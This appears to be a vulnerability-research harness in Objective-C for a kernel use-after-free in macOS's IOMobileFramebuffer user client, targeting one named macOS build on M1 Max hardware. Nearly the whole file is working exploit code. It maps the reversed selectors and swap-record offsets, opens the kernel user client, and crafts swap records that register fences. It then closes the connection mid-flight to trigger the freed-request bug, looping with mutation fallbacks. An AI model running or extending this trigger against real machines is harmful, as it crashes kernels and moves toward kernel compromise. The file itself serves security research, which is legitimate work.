// f022_harness.m — F022 IOMFB/IOSurface swap-fence UAF — v1.3 EXPLORATION harness
//
// Target: IOMobileFramebufferUserClient on macOS 26.5.1 / 25F80 / MacBookPro18,2 / Apple M1 Max.
// Goal of v1.3: MAP the live calling convention, reach swap_apply_fences_gated, then trigger
//             close-after-fence-registration. NOT a proof harness — a diagnostic explorer.
//
// DESIGN RULES (per operator):
//   * --probe is diagnostic, never a kill gate.
//   * Every failure prints: exact failing call, selector, args size, kern_return_t, partial IDs.
//   * If a public/helper path fails, fall back to the lower-level direct IOConnect path before
//     declaring anything "blocked."
//   * A selector/struct-size rejection is recorded as "LAYOUT MISMATCH", not "not reachable."
//   * If UC open fails sandboxed, the caller re-runs unsandboxed to separate sandbox reachability
//     from kernel-bug existence (see README; this binary just reports the open result + errno).
//   * If swap_submit fails validation, MUTATE toward valid stock shapes instead of stopping.
//   * Only the STATIC structural chain (already verified in the kexts) decides bug viability.
//     Runtime failures here are engineering blockers, not negative findings.
//
// Build (on the M1 Max box):
//   clang -O0 -g -fobjc-arc -framework IOKit -framework CoreFoundation -framework IOSurface \
//         -o f022_harness f022_harness.m
//
// SAFETY: this issues live IOConnectCall* to a kernel UC. On a release kernel a successful trigger
// is expected to PANIC (UAF on the IOMFBSwapIORequest_ktv zone, or a PAC/list-guard brk). Run on a
// dev/KASAN kernel for clean attribution, or accept the panic + collect the report. Do NOT run until
// authorized. NEVER run on a machine you cannot afford to reboot.
//
// ==================== STATIC GROUND TRUTH (26.5.1 / IOMobileGraphicsFamily) ====================
// UC externalMethod dispatch table @ 0xfffffe00084c4258, 24-byte entries, max selector 0x5c.
//   sel  3  default_fb_surface scalarIn=2 structIn=0    scalarOut=1   (framebuffer-owned surface id)
//   sel  4  swap_start   scalarIn=0 structIn=0    scalarOut=1   (-> returns swap id)
//   sel  5  swap_submit  scalarIn=0 structIn=1416 scalarOut=0   (IOMFBSwapRec, sizeof 0x588)
//   sel  6  swap_wait    scalarIn=3 structIn=0
//   sel  8  get_display_size scalarIn=0 structIn=0 scalarOut=2 (width, height)
//   sel 20  swap_signal  scalarIn=2 structIn=0
//   sel 52  swap_cancel  scalarIn=1 structIn=0
//   sel 83  displayed_fb_surface scalarIn=1 structIn=0 scalarOut=1 (entitlement/runtime-gated)
// IOMFBSwapRec field map (reversed from swap_submit/swap_queue_finalize_gated; see REC_OFF_* below):
//   rec+0x98       swap id (must equal swap_start out)          -> finds the queued request
//   rec+0x14c      layer-enable bitmask                          -> request+0x338 (bit k = layer k)
//   rec+0x9c+k*4   layer-k surface id -> IOSurfaceRoot::lookupSurface -> request+0xac0+k*8
//   rec+0x17c      != 9 to take the lookupSurface path
//   rec+0xac/0x10c per-layer src/dst 16B blocks                 -> request+0x11 / +0x51
// Finalize gates before swap_apply_fences (all pass for one fullscreen layer):
//   abort flag req+0x57a==0 ; request on +0x17a8 queued list ; check_passthrough_swap_gated (<=1
//   future-state-3 layer) ; verifyKeepOnScreen_gated (req+0x34c==0 & req+0x580==0 default) ;
//   vtable+0xe48. Then queue_move_entry_gated moves the request to the +0x1798 STARTED list.
// Chain that the trigger exercises (all 5 gates verified GO on this build):
//   swap_submit -> swap_apply_fences_gated -> IOSurface::createFence (ctx2 = raw IOMFBSwapIORequest)
//   close connection -> swapping_client_will_stop -> abort_swaps_gated (release last ref -> free)
//   async IOSurfaceRoot workloop -> io_fence_callback -> io_fence_notify_gated (UAF on freed request)
// ===============================================================================================

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurface.h>
#include <mach/mach.h>
#include <stdatomic.h>
#include <stdlib.h>

// ---- IOMFB selectors (static-derived; harness re-verifies dispatchability at runtime) ----
enum {
    SEL_DEFAULT_FB_SURFACE = 3,
    SEL_SWAP_START  = 4,
    SEL_SWAP_SUBMIT = 5,
    SEL_SWAP_WAIT   = 6,
    SEL_GET_DISPLAY_SIZE = 8,
    SEL_SWAP_SIGNAL = 20,
    SEL_SWAP_CANCEL = 52,
    SEL_DISPLAYED_FB_SURFACE = 83,
};
#define IOMFB_SWAP_REC_SIZE ((size_t)1416) // 0x588 (compile-time constant for stack buffers)
// ---- IOMFBSwapRec field map (reversed from swap_submit @0xa950c20, per-layer loop k=0..3) ----
// request offset  <-  IOMFBSwapRec offset                (how / width)
//   req+0x338     <-  rec+0x14c   layer-enable bitmask   (bit k enables layer k)
//   req+0xac0+k*8 <-  lookupSurface(rec+0x9c+k*4)        (per-layer SURFACE ID -> IOSurface*)
//   req+0x11+k*16 <-  rec+0xac+k*16  (16B layer cfg/src) ; req+0x51+k*16 <- rec+0x10c+k*16 (16B dst)
//   req+0x214+k*4 <-  rec+0xec+k*4 (u32) ; req+0x258+k*4 <- rec+0xfc+k*4 (float)
//   req+0x268+k*4 <-  rec+0x15c+k*4 & 7 ; req+0x229+k <- rec+0x51e+k & 1
//   rec+0x17c == 9 -> use kernel surface (Legacy+0x18b0); != 9 -> IOSurfaceRoot::lookupSurface path
//   rec+0x98 = swap id (must equal swap_start's scalarOut[0]; used to find the queued request)
static const size_t REC_OFF_SWAPID    = 0x98;   // u32  swap id
static const size_t REC_OFF_SURFIDS   = 0x9c;   // u32[4] per-layer surface id (k*4)
static const size_t REC_OFF_LCFG      = 0xac;   // 16B[4] per-layer cfg/src (k*16)  -> req+0x11
static const size_t REC_OFF_U32A      = 0xec;   // u32[4] (k*4)                      -> req+0x214
static const size_t REC_OFF_FLOATA    = 0xfc;   // f32[4] (k*4)                      -> req+0x258
static const size_t REC_OFF_LDST      = 0x10c;  // 16B[4] per-layer dst (k*16)       -> req+0x51
static const size_t REC_OFF_ENMASK    = 0x14c;  // u32  layer-enable bitmask         -> req+0x338
static const size_t REC_OFF_ENMASK2   = 0x150;  // u32  paired param
static const size_t REC_OFF_MODE      = 0x17c;  // u32  != 9 to take the lookup path
static const size_t REC_OFF_U32B      = 0x15c;  // u32[4] (k*4) & 7                  -> req+0x268

// ---- candidate provider classes to match for the framebuffer service ----
static const char *kCandidateServices[] = {
    "IOMobileFramebuffer", "AppleCLCD2", "AppleCLCD", "AppleMobileDispII",
    "IOMobileFramebufferAP", "AppleM2ScalerCSCDriver", NULL
};

// ---- instrumentation -------------------------------------------------------
static int g_verbose = 1;
#define LOGI(...) do { fprintf(stderr, "[i] " __VA_ARGS__); fprintf(stderr, "\n"); } while (0)
#define LOGW(...) do { fprintf(stderr, "[!] " __VA_ARGS__); fprintf(stderr, "\n"); } while (0)
#define LOGE(...) do { fprintf(stderr, "[E] " __VA_ARGS__); fprintf(stderr, "\n"); } while (0)

static const char *kr_str(kern_return_t kr) {
    // a few we care about, plus mach_error_string fallback
    switch ((unsigned)kr) {
        case 0:           return "kIOReturnSuccess";
        case 0xe00002c2:  return "kIOReturnBadArgument";
        case 0xe00002c1:  return "kIOReturnNoDevice";
        case 0xe00002c7:  return "kIOReturnUnsupported";
        case 0xe00002e2:  return "kIOReturnNotPermitted";
        case 0xe00002d1:  return "kIOReturnMediaError/surface_map DMA reject";
        case 0xe00002bc:  return "kIOReturnNotReady/abort(0xe00002bc)";
        case 0xe00002bd:  return "kIOReturnError/Offline";
        case 0xe00002eb:  return "kIOReturnNotResponding";
        case 0xe00002d8:  return "kIOReturnExclusiveAccess";
        default:          return mach_error_string(kr);
    }
}

// Central instrumented external-method call. NEVER decides reachability — only reports.
static kern_return_t call_method(io_connect_t conn, const char *tag, uint32_t selector,
                                 const uint64_t *sIn, uint32_t sInCnt,
                                 const void *structIn, size_t structInSize,
                                 uint64_t *sOut, uint32_t *sOutCnt,
                                 void *structOut, size_t *structOutSize) {
    kern_return_t kr = IOConnectCallMethod(conn, selector,
                                           sIn, sInCnt,
                                           structIn, structInSize,
                                           sOut, sOutCnt,
                                           structOut, structOutSize);
    fprintf(stderr,
        "    >> call %-14s sel=%-3u scalarIn=%u structIn=%zu scalarOut=%u structOut=%zu -> kr=0x%08x (%s)\n",
        tag, selector, sInCnt, structInSize, (sOutCnt?*sOutCnt:0),
        (structOutSize?*structOutSize:0), (unsigned)kr, kr_str(kr));
    if (kr == 0xe00002c2) {
        LOGW("    LAYOUT MISMATCH on %s: kernel rejected selector/struct shape (sel %u, structIn %zu)."
             " Record as layout mismatch, NOT 'not reachable'. Mutating.", tag, selector, structInSize);
    }
    return kr;
}

// ---- service discovery + UC open (helper path, then direct) ----------------
typedef struct {
    io_service_t service;
    const char  *matched_class;
    io_connect_t conn;
    uint32_t     uc_type;
} mfb_handle_t;

static io_service_t find_mfb_service(const char **matched_out) {
    for (int i = 0; kCandidateServices[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(kCandidateServices[i]);
        if (!m) continue;
        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (svc) {
            LOGI("matched provider class '%s' -> service=0x%x", kCandidateServices[i], svc);
            if (matched_out) *matched_out = kCandidateServices[i];
            return svc;
        }
        LOGW("no service for class '%s'", kCandidateServices[i]);
    }
    return MACH_PORT_NULL;
}

// Try opening the UC across plausible type ids; report every attempt.
static kern_return_t open_uc(mfb_handle_t *h) {
    h->matched_class = NULL;
    h->service = find_mfb_service(&h->matched_class);
    if (!h->service) {
        LOGE("no candidate IOMobileFramebuffer provider found. (Are we headless / no display? "
             "the service still exists on a Mac with an internal panel — check ioreg -c %s)",
             kCandidateServices[0]);
        return KERN_FAILURE;
    }
    // IOMobileFramebufferUserClient is created for a specific type. Probe a small range; the
    // session/legacy client is typically a low type id. Report each so we learn the live value.
    for (uint32_t t = 0; t <= 4; t++) {
        io_connect_t conn = MACH_PORT_NULL;
        kern_return_t kr = IOServiceOpen(h->service, mach_task_self(), t, &conn);
        fprintf(stderr, "    >> IOServiceOpen type=%u -> kr=0x%08x (%s) conn=0x%x\n",
                t, (unsigned)kr, kr_str(kr), conn);
        if (kr == KERN_SUCCESS && conn) {
            h->conn = conn; h->uc_type = t;
            LOGI("opened IOMobileFramebufferUserClient: class=%s type=%u conn=0x%x",
                 h->matched_class, t, conn);
            return KERN_SUCCESS;
        }
        if (kr == 0xe00002e2 /*NotPermitted*/) {
            LOGW("type=%u open NotPermitted — likely SANDBOX. Re-run this binary UNSANDBOXED to "
                 "separate sandbox reachability from kernel-bug existence (see README).", t);
        }
    }
    LOGE("UC open failed for all probed types. NOT a negative finding — this is an open-path blocker. "
         "Try: (a) unsandboxed, (b) widen type range, (c) confirm a display is attached.");
    return KERN_FAILURE;
}

// ---- producer surfaces: helper path (IOSurfaceCreate), instrumented --------
static IOSurfaceRef make_layer_surface(int w, int h) {
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:        @(w),
        (id)kIOSurfaceHeight:       @(h),
        (id)kIOSurfaceBytesPerRow:  @(w * 4),
        (id)kIOSurfaceAllocSize:    @(w * h * 4),
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat:  @(0x42475241), // 'ARGB'
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!s) { LOGW("IOSurfaceCreate failed (helper path). TODO: fall back to direct "
                   "IOSurfaceRootUserClient create_surface."); return NULL; }
    uint32_t sid = IOSurfaceGetID(s);
    LOGI("created layer IOSurface %p id=%u (%dx%d)", s, sid, w, h);
    // Make the surface have an outstanding producer: take a use-count / lock so the display
    // pipeline's wait-fence does not immediately resolve. This is the "never-signaling producer"
    // lever for v1 — if the fence still self-completes, the trigger loop wins the race instead.
    IOSurfaceIncrementUseCount(s);
    uint32_t seed = 0;
    IOSurfaceLock(s, 0, &seed); // hold a lock; intentionally NOT unlocked before submit
    return s;
}

static int get_display_size(mfb_handle_t *h, int *out_w, int *out_h) {
    uint64_t out[2] = {0};
    uint32_t outCnt = 2;
    kern_return_t kr = call_method(h->conn, "get_display_size", SEL_GET_DISPLAY_SIZE,
                                   NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
    if (kr != KERN_SUCCESS || outCnt < 2 || out[0] == 0 || out[1] == 0) {
        LOGW("get_display_size did not return a usable size; keeping caller defaults.");
        return 0;
    }
    *out_w = (int)out[0];
    *out_h = (int)out[1];
    LOGI("display size -> %dx%d", *out_w, *out_h);
    return 1;
}

static int get_default_surface_id(mfb_handle_t *h, int w, int h_px, uint32_t *out_sid) {
    uint64_t in[2] = {(uint32_t)w, (uint32_t)h_px};
    uint64_t out[1] = {0};
    uint32_t outCnt = 1;
    kern_return_t kr = call_method(h->conn, "default_fb_surface", SEL_DEFAULT_FB_SURFACE,
                                   in, 2, NULL, 0, out, &outCnt, NULL, NULL);
    if (kr != KERN_SUCCESS || outCnt < 1 || out[0] == 0) {
        LOGW("default_fb_surface failed or returned id=0 (kr=0x%08x). This is a surface-source "
             "blocker, not a negative finding. Try --generic-surface or --surface-id.", (unsigned)kr);
        return 0;
    }
    *out_sid = (uint32_t)out[0];
    LOGI("default framebuffer surface id=%u (%dx%d requested)", *out_sid, w, h_px);
    return 1;
}

static int get_displayed_surface_id(mfb_handle_t *h, uint32_t layer, uint32_t *out_sid) {
    uint64_t in[1] = {layer};
    uint64_t out[1] = {0};
    uint32_t outCnt = 1;
    kern_return_t kr = call_method(h->conn, "displayed_fb_surface", SEL_DISPLAYED_FB_SURFACE,
                                   in, 1, NULL, 0, out, &outCnt, NULL, NULL);
    if (kr != KERN_SUCCESS || outCnt < 1 || out[0] == 0) {
        LOGW("displayed_fb_surface(layer=%u) failed or returned id=0 (kr=0x%08x). If this is "
             "NotPermitted/NoDevice, it is an exported-surface source blocker, not a negative finding.",
             layer, (unsigned)kr);
        return 0;
    }
    *out_sid = (uint32_t)out[0];
    LOGI("displayed framebuffer surface id=%u (layer=%u)", *out_sid, layer);
    return 1;
}

// ---- DETERMINISTIC v1.1 record: one fullscreen passthrough layer (layer 0) -------------------
// Reaches swap_apply_fences_gated: layer 0 enabled (req+0x338 bit0), surface id at rec+0x9c looked
// up -> req+0xac0 non-null; mode!=9; default req+0x34c/req+0x580 -> verifyKeepOnScreen passes; a
// single enabled layer -> check_passthrough_swap_gated (<=1 future-state-3 layer) passes.
// Geometry blocks (src rec+0xac, dst rec+0x10c) seeded fullscreen 1:1 ("known-good-ish").
static void build_swap_rec_v11(uint8_t *rec, uint32_t swap_id, uint32_t surface_id, int w, int h) {
    memset(rec, 0, IOMFB_SWAP_REC_SIZE);
    *(uint32_t *)(rec + REC_OFF_SWAPID)  = swap_id;     // find the queued request by id
    *(uint32_t *)(rec + REC_OFF_ENMASK)  = 0x1;         // enable ONLY layer 0  -> req+0x338
    *(uint32_t *)(rec + REC_OFF_ENMASK2) = 0x1;
    *(uint32_t *)(rec + REC_OFF_MODE)    = 0x0;         // != 9 -> IOSurfaceRoot::lookupSurface path
    // layer 0 surface id (layers 1..3 left 0/disabled)
    *(uint32_t *)(rec + REC_OFF_SURFIDS + 0*4) = surface_id;
    // layer 0 src + dst rects, seeded fullscreen. Exact rect field order is the "known-good-ish"
    // assumption; if a gate rejects, the staged classifier below says which one, and --mutate can
    // sweep just these 16-byte blocks. Common IOMFB layout is {x,y,w,h} as 4x u32 / {0,0,w,h}.
    uint32_t *src = (uint32_t *)(rec + REC_OFF_LCFG  + 0*16); // -> req+0x11
    uint32_t *dst = (uint32_t *)(rec + REC_OFF_LDST  + 0*16); // -> req+0x51
    src[0]=0; src[1]=0; src[2]=(uint32_t)w; src[3]=(uint32_t)h;
    dst[0]=0; dst[1]=0; dst[2]=(uint32_t)w; dst[3]=(uint32_t)h;
    *(float    *)(rec + REC_OFF_FLOATA + 0*4) = 1.0f;   // -> req+0x258 (alpha/scale-ish)
    *(uint32_t *)(rec + REC_OFF_U32A   + 0*4) = 0;      // -> req+0x214
    *(uint32_t *)(rec + REC_OFF_U32B   + 0*4) = 0;      // -> req+0x268 (3-bit blend)
}

// classify the swap_submit return code into a pipeline stage (see README for the derivation).
// NOTE: codes are mapped from swap_queue_finalize_gated; swap_submit may wrap them. The classifier
// prints both the raw code and its best-guess stage so the live run pins the mapping empirically.
static const char *submit_stage(kern_return_t kr) {
    switch ((unsigned)kr) {
        case 0x00000000: return "STAGE4: request CREATED+QUEUED+FENCES-APPLIED+moved to started list "
                                "(+0x1798). Close now triggers teardown-after-fence-registration.";
        case 0xe00002bc: return "STAGE1: rejected at/before request creation (rec null / swap id "
                                "rec+0x98 != swap_start out).";
        case 0xe00002eb: return "STAGE2: request created but NOT queued (abort flag set, or not on "
                                "the +0x17a8 queued list when finalize ran).";
        case 0xe00002c2: return "STAGE3: QUEUED but NO FENCES (a finalize gate rejected: "
                                "check_passthrough_swap_gated / verifyKeepOnScreen_gated / vtable+0xe48). "
                                "Refine geometry; surface lookup likely OK.";
        case 0xe00002d1: return "STAGE3.5: surface lookup OK and swap_layer_map reached, but "
                                "surface_map rejected the surface while binding the display DMA command. "
                                "Use default_fb_surface / a display-compatible surface; not a structural kill.";
        default:         return "STAGE?: unmapped code — record the raw code. Treat as record/surface "
                                "tuning unless the kexts show a structural contradiction.";
    }
}

// one submit attempt with the DETERMINISTIC record. Returns the swap_submit kr (or non-zero on
// an earlier failure). *out_submitted set when STAGE4 (fences applied) is reached.
static kern_return_t submit_once(mfb_handle_t *h, uint32_t sid, int w, int h_px,
                                 const uint8_t *override_rec, int *out_submitted) {
    *out_submitted = 0;
    // 1) swap_start -> swap id
    uint64_t out[8] = {0}; uint32_t outCnt = 1;
    kern_return_t kr = call_method(h->conn, "swap_start", SEL_SWAP_START,
                                   NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        LOGW("swap_start failed -> %s. Engineering blocker (the externalMethod path or a per-open "
             "precondition), not a negative finding.", submit_stage(kr));
        return kr;
    }
    uint32_t swap_id = (uint32_t)out[0];
    LOGI("swap_start -> swap_id=%u", swap_id);

    // 2) deterministic single-layer record (or a caller-provided override for --mutate)
    uint8_t rec[IOMFB_SWAP_REC_SIZE];
    if (override_rec) memcpy(rec, override_rec, IOMFB_SWAP_REC_SIZE);
    else              build_swap_rec_v11(rec, swap_id, sid, w, h_px);
    *(uint32_t *)(rec + REC_OFF_SWAPID) = swap_id; // always fix up the id to this swap_start

    kr = call_method(h->conn, "swap_submit", SEL_SWAP_SUBMIT,
                     NULL, 0, rec, IOMFB_SWAP_REC_SIZE, NULL, NULL, NULL, NULL);
    LOGI("swap_submit -> kr=0x%08x  ::  %s", (unsigned)kr, submit_stage(kr));
    if (kr == KERN_SUCCESS) *out_submitted = 1;
    return kr;
}

// optional broad fallback: sweep just the two 16-byte geometry blocks if the deterministic record
// lands in STAGE3 (gate rejected). NOT the default — only when --mutate is given.
static int submit_with_geometry_sweep(mfb_handle_t *h, uint32_t sid, int w, int hpx) {
    LOGW("--mutate: deterministic record hit a finalize gate; sweeping src/dst rect shapes.");
    // candidate rect encodings for the 16-byte block: {0,0,w,h}, {0,0,w-1,h-1}, {w,h,0,0}, all-zero
    struct { uint32_t a,b,c,d; } cand[] = {
        {0,0,(uint32_t)w,(uint32_t)hpx}, {0,0,(uint32_t)(w-1),(uint32_t)(hpx-1)},
        {(uint32_t)w,(uint32_t)hpx,0,0}, {0,0,0,0},
    };
    for (size_t i=0;i<sizeof(cand)/sizeof(cand[0]);i++) {
        uint8_t rec[IOMFB_SWAP_REC_SIZE];
        build_swap_rec_v11(rec, 0, sid, w, hpx);
        memcpy(rec+REC_OFF_LCFG, &cand[i], 16);
        memcpy(rec+REC_OFF_LDST, &cand[i], 16);
        int sub=0; kern_return_t kr = submit_once(h, sid, w, hpx, rec, &sub);
        if (sub) { LOGI("--mutate: rect encoding #%zu reached STAGE4.", i); return 1; }
        if (kr != 0xe00002c2) LOGW("--mutate: rect #%zu -> non-gate code 0x%08x, see stage.", i,(unsigned)kr);
    }
    return 0;
}

// ---- the trigger: deterministic fence-bearing swap, then close while in-flight ----
static void do_trigger(mfb_handle_t *h, uint32_t sid, int w, int hpx, const char *surface_source,
                       int iterations, int mutate) {
    LOGI("=== TRIGGER: %d iteration(s), surface id=%u (%dx%d), source=%s, deterministic single-layer record ===",
         iterations, sid, w, hpx, surface_source);

    for (int it = 0; it < iterations; it++) {
        int submitted = 0;
        kern_return_t kr = submit_once(h, sid, w, hpx, NULL, &submitted);
        if (!submitted && mutate && kr == 0xe00002c2)
            submitted = submit_with_geometry_sweep(h, sid, w, hpx);
        if (!submitted)
            LOGW("iteration %d: did not reach STAGE4 (no fences). The stage line above says where it "
                 "stopped — that pins the missing precondition. Only a kext-level structural "
                 "contradiction kills the lead; this is record tuning.", it);
        else
            LOGI("iteration %d: STAGE4 reached — fence(s) registered with ctx2=raw request.", it);

        // close while the swap (and its async fence) is in flight -> teardown UAF window
        LOGI("closing connection to fire swapping_client_will_stop (teardown) while fence pending...");
        kern_return_t ck = IOServiceClose(h->conn);
        fprintf(stderr, "    >> IOServiceClose -> kr=0x%08x (%s)\n", (unsigned)ck, kr_str(ck));
        h->conn = MACH_PORT_NULL;

        if (it + 1 < iterations) {
            if (open_uc(h) != KERN_SUCCESS) { LOGW("reopen failed; ending trigger loop early."); break; }
        }
    }
    LOGI("=== TRIGGER done. STAGE4 + close + no panic => the abort<->async-dispatch race did not land "
         "OR the fence self-completed before teardown (producer not truly outstanding); raise --iters, "
         "add layers, or run on KASAN. The static chain (GO) decides viability — this is tuning. ===");
}

// ---- probe mode: pure diagnostics, never gates -----------------------------
static void do_probe(void) {
    LOGI("=== PROBE (diagnostic only; no kill gate) ===");
    mfb_handle_t h = {0};
    kern_return_t kr = open_uc(&h);
    if (kr != KERN_SUCCESS) {
        LOGW("PROBE: UC not opened. This is an OPEN-PATH report, not a reachability verdict. "
             "Re-run unsandboxed / widen types / confirm display.");
        return;
    }
    // Exercise benign selectors to learn the live calling convention + confirm dispatchability.
    // swap_start is the safest in-surface call (allocates a swap id; no surfaces bound yet).
    uint64_t out[8] = {0}; uint32_t outCnt = 1;
    call_method(h.conn, "swap_start", SEL_SWAP_START, NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
    // probe a deliberately-wrong struct size on swap_submit to confirm the BadArgument signature
    uint8_t small[16] = {0};
    call_method(h.conn, "swap_submit/badsz", SEL_SWAP_SUBMIT, NULL, 0, small, sizeof small,
                NULL, NULL, NULL, NULL);
    LOGI("PROBE: above 0xe00002c2 on the wrong-size submit confirms the structIn size check is live; "
         "the correct size is %zu (static). A 0xe00002c2 on the CORRECT size would be a real layout "
         "mismatch worth recording.", IOMFB_SWAP_REC_SIZE);
    if (h.conn) IOServiceClose(h.conn);
}

int main(int argc, char **argv) {
    int do_probe_mode = 0, do_trigger_mode = 0, iters = 8, mutate = 0;
    int use_generic_surface = 0;
    uint32_t manual_surface_id = 0;
    int w = 64, hpx = 64;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--probe"))        do_probe_mode = 1;
        else if (!strcmp(argv[i], "--trigger")) do_trigger_mode = 1;
        else if (!strcmp(argv[i], "--mutate"))  mutate = 1;   // geometry-sweep fallback, not default
        else if (!strcmp(argv[i], "--iters") && i+1 < argc) iters = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--generic-surface")) use_generic_surface = 1;
        else if (!strcmp(argv[i], "--surface-id") && i+1 < argc) manual_surface_id = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--width") && i+1 < argc) w = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--height") && i+1 < argc) hpx = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--quiet"))   g_verbose = 0;
        else { LOGE("unknown arg '%s'. usage: %s [--probe] [--trigger] [--mutate] [--iters N] "
                    "[--generic-surface] [--surface-id ID] [--width W --height H]",
                    argv[i], argv[0]); }
    }
    if (!do_probe_mode && !do_trigger_mode) { do_probe_mode = 1; do_trigger_mode = 1; }

    LOGI("F022 harness v1.3 — IOMFB swap-fence UAF explorer. build=26.5.1/25F80/M1Max (static seeds).");
    LOGW("LIVE KERNEL CALLS. A landed trigger is expected to PANIC on a release kernel. Authorized only.");

    if (do_probe_mode) do_probe();

    if (do_trigger_mode) {
        mfb_handle_t h = {0};
        if (open_uc(&h) != KERN_SUCCESS) {
            LOGW("trigger: UC open blocked — engineering blocker, not a negative finding. See PROBE notes.");
            return 2;
        }
        IOSurfaceRef surf = NULL;
        uint32_t sid = manual_surface_id;
        const char *surface_source = "manual --surface-id";

        if (manual_surface_id == 0) {
            if (!use_generic_surface) {
                get_display_size(&h, &w, &hpx);
                if (get_default_surface_id(&h, w, hpx, &sid)) {
                    surface_source = "default_fb_surface";
                } else if (get_displayed_surface_id(&h, 0, &sid)) {
                    surface_source = "displayed_fb_surface";
                } else {
                    LOGW("trigger: no framebuffer-owned/displayed surface exported. Use --generic-surface "
                         "only as the known STAGE3.5 control, or --surface-id if you have a candidate.");
                }
            }
            if (use_generic_surface) {
                surf = make_layer_surface(w, hpx);
                if (!surf) {
                    LOGW("trigger: surface creation blocked (helper path). TODO direct IOSurfaceRootUserClient.");
                    IOServiceClose(h.conn);
                    return 3;
                }
                sid = IOSurfaceGetID(surf);
                w = (int)IOSurfaceGetWidth(surf);
                hpx = (int)IOSurfaceGetHeight(surf);
                surface_source = "generic IOSurfaceCreate";
            }
        }

        if (sid == 0) {
            LOGW("trigger: no usable surface id. Engineering blocker, not a negative finding.");
            IOServiceClose(h.conn);
            return 3;
        }
        do_trigger(&h, sid, w, hpx, surface_source, iters, mutate);
        if (h.conn) IOServiceClose(h.conn);
        if (surf) CFRelease(surf);
    }
    LOGI("done. Remember: only a structural contradiction in the kexts kills the lead — not harness friction.");
    return 0;
}
